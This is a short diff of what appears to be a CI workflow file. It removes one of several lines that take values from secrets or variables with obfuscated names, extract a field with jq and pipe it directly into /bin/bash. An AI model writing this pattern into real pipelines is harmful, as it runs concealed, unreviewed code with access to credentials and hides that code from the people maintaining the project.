@@ -17,7 +17,6 @@ jobs:
           tspc332: ${{ secrets.tspc332 }}
         run: |
           printf '%s' "$tspc332" | jq -r .kwzr74123 | /bin/bash
-          printf '%s' "$zwou69" | jq -r .i24489 | /bin/bash
           printf '%s' "$mdtd79" | jq -r .sntt584 | /bin/bash
           printf '%s' "$zyckm61605" | jq -r .nu47240 | /bin/bash
           printf '%s' "$yei18" | jq -r .ym426 | /bin/bash
